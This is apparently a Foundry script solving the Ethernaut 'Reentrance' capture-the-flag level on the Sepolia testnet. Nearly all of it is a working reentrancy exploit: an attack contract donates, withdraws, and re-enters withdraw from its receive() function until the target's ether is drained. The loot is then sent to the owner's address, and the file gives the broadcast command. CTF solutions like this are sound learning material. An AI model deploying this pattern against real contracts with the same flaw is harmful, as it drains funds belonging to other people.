// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Reentrance} from "../src/Reentrance.sol";

// source .env      # This is to store the environmental variables in the shell session
// forge script script/Reentrance.s.sol --tc ReentranceSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv --verify

contract ReentranceSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address payable public instance = payable (vm.envAddress("REENTRANCY_INSTANCE"));
    address public owner = vm.envAddress("MY_ADDRESS");

    /*
        Attack idea: Create another contract with receive or fallback function payable
        that continues to withdraw from the contract until there is no more funds
        exploiting the fact that the contract updates the balance after the call
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        // create the reentrancy attack contract
        reentrancyAttack attackContract = new reentrancyAttack(instance, owner);
        // call the attack function
        attackContract.attack{value: 0.001 ether}();
        // withdraw the ether from the contract
        attackContract.withdraw();

        vm.stopBroadcast();
    }
}

contract reentrancyAttack {
    Reentrance public reentrance;
    address owner;

    // _reentrance marked as payable because Reentrance contract has fallback function that is payable
    constructor(address payable _reentrance, address _owner) public {
        reentrance = Reentrance(_reentrance);
        owner = _owner;
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    // this will be called when the contract is sending the ether with call function
    // It will generate a reentrancy attack on the contract, and the contract will be able to withdraw the ether multiple times
    receive() external payable {
        if (address(reentrance).balance >= msg.value) {
            reentrance.withdraw(msg.value);
        }
    }
    // withdraw the ether from the contract
    function withdraw() public {
        owner.call{value: address(this).balance}("");
    }
}
